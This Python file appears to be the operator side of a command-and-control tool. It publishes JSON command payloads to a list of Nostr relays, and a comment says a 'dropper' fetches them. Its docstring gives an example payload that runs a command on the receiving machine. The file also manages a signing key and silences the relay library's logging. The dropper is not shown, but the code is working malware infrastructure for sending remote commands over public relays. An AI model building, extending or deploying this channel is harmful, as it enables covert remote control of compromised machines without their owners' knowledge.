import os, json,logging
import pynostr.relay     as pynostr_relay

from pynostr.key         import PrivateKey
from src.interact_nodes  import push


RELAYS      = [] 
PRIVATE_KEY = None
PUBLIC_KEY  = None
KEY_PATH    = os.path.join( os.path.dirname( __file__ ), "private_key" )


#
#   Implementation
#
def configure_websocket():
    websocket_connect = pynostr_relay.websocket_connect

    def patched_websocket_connect( *args, **kwargs ):
        ping_interval = kwargs.get( "ping_interval", 60 )
        ping_timeout  = kwargs.get( "ping_timeout", 120 )

        if ping_timeout >= ping_interval:
            kwargs[ "ping_timeout" ] = max( 1, ping_interval // 2 )

        return websocket_connect( *args, **kwargs )

    pynostr_relay.websocket_connect = patched_websocket_connect

    logger           = logging.getLogger( "pynostr.relay" )
    logger.propagate = False
    logger.addHandler( logging.NullHandler() )


def generate_key():
    global PRIVATE_KEY, PUBLIC_KEY
    
    PRIVATE_KEY = PrivateKey()
    PUBLIC_KEY  = PRIVATE_KEY.public_key.hex()
     
    with open( KEY_PATH, "w+" ) as file: 
        file.write( str( PRIVATE_KEY ) )


def initialize_keys():
    global PRIVATE_KEY, PUBLIC_KEY
    
    # Check if private key already is stored
    if not os.path.exists( KEY_PATH ):
        generate_key()
        return 
    
    # Open an old private key
    with open( KEY_PATH, "r" ) as file:
        private_key_hex = file.read().strip()
    
        # Key empty for some reason?
        if private_key_hex == "":
            generate_key()
            return
    
    # Reconstruct old key.
    PRIVATE_KEY = PrivateKey.from_hex( private_key_hex )
    PUBLIC_KEY  = PRIVATE_KEY.public_key.hex()


#
#   Interface
#
def send_payload( payload : dict ):
    """
    
    Example payload: { "command" : "cli", "args" : "xcalc" }
    
    """
    
    user_content = json.dumps( payload )
                 
    # Push the payload the dropper fetches to nostr
    msg_public_key = ""
    for relay in RELAYS:
        _return = push( 
            relay        = relay,
            private_key  = PRIVATE_KEY,
            user_content = user_content,
        )
        
        msg_public_key = _return[ 0 ]
        #print(relay, msg_public_key) # debug print


def main( relaylist : str ):
    global RELAYS, PRIVATE_KEY
    RELAYS = []

    configure_websocket()


    # Initialize keys.
    initialize_keys()
    
    # Load in the list of relays/nodes.
    with open( relaylist, "r" ) as file:
        for line in file.readlines():
            RELAYS.append( line.strip("\n") )
     
